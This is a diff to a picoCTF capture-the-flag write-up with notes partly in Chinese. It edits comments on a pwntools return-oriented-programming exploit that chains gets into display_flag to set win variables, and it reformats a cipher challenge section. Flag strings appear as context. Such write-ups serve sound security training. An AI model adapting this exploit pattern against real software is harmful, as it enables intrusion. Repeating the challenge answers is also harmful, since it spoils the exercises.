@@ -146,7 +146,7 @@ picoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}
 
 看了大大的writeup 才發現 乾 怎沒想到
 
-它是call gets 改 win* 因為他們是連在一起的
+它是call gets 改 win123 因為他們是連在一起的
 
 改完跳 display_flag
 
@@ -246,7 +246,7 @@ payload += p32(gets_plt)              # ret1
 payload += p32(display_flag_addr)     # ret2
 payload += p32(win1_addr)             # ret1 arg
 r.sendline(payload)
-r.sendline('\x01'*3)                  # get() input
+r.sendline('\x01'*3)                  # get() input chane win123
 r.interactive()
 
 ```
@@ -595,8 +595,9 @@ https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E4%BF%A1%E8%99%9F%E6%97%97
 
 PICOCTF{F1AG5AND5TUFF}
 ## waves over lambda - Points: 300 - (Solves: 2647)Cryptography
-```
 ### code
+
+```
 -------------------------------------------------------------------------------
 bfowyqpx ilyl ux sfhy vnqw - vylthlobs_ux_b_fcly_nqmarq_mhjwjloofr
 -------------------------------------------------------------------------------
